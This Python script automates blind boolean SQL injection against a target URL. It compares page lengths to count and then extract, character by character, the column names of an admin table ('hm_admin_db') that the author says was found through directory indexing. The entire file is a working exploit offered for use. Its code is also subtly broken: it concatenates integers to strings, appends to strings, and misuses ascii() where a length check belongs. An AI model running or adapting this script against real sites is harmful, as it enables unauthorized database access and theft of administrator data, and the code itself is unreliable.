# -*- coding: utf-8 -*-
"""
Created on Wed Oct 28 20:03:11 2020

@author: WinterMute1000
"""

import requests
DEFAULT_URL="http://127.0.0.1/" #Insert your target url
TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
#TRUE_RES==different html length
KNOWN_TABLE_NAME="hm_admin_db" #I got a admin table name to use file download and directory Indexing. LOL

def get_columns_num():
    for i in range(1,21):
        if TRUE_RES==len(requests.get(DEFAULT_URL+
                                 """%27+and+%28select+count%28column_name%29+from+information_schema.columns+
                                 where+table_name%3D%27"""+
                                 KNOWN_TABLE_NAME+
                                 "%27%29+%3D"+i+"+--+").text):
            print("Columns num:"+i)
            return i;
    
    print("Columns num over 20")
    return 20;

def get_columns_name(columns_num):
    columns_name_list=['']*columns_num
    for idx in range(0,columns_num):
        for column_name_length in range(1,31): # get columns name length
            if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28select+column_name+from
                                          +information_schema.columns+WHERE+table_name%3D%27"""+
                                          KNOWN_TABLE_NAME+"%27+limit+"+str(idx)+
                                      "%2C"+str(idx+1)+"%29%3D"+column_name_length+"+--+").text):
                for column_name_idx in range(0,column_name_length):
                    for ascii_code in range(32,127): #get one character columns name
                        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+column_name+from
                                      +information_schema.columns+WHERE+table_name%3D%27"""+
                                      KNOWN_TABLE_NAME+"%27+limit+"+str(idx)+
                                      "%2C"+str(idx+1)+"%29%2C"+column_name_idx+"%2C1%29%29%3D"+
                                          ascii_code+"+--+").text):
                            columns_name_list[idx].append(chr(ascii_code))
                break
            
    print(columns_name_list)
    return columns_name_list
        

if __name__=="__main__":
    columns_num=get_columns_num()
    get_columns_name(columns_num)
